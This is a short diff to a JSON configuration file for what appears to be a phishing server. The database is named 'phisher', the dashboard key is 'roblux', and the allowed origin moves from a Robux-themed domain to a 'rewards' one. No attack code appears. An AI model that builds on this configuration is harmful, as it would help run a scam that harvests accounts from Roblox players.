@@ -1,8 +1,8 @@
 {
     "dashboardAuthKey": "roblux",
-    "allowedOrigins": ["robux.memester.xyz"],
+    "allowedOrigins": ["rewards.memester.xyz"],
     "logsPath": "logs",
     "logRetentionCount": 10,
-    "port": 5055,
-    "dbconn": "mongodb://192.168.0.42/phisher"
+    "port": 5098,
+    "dbconn": "mongodb://localhost/phisher"
 }
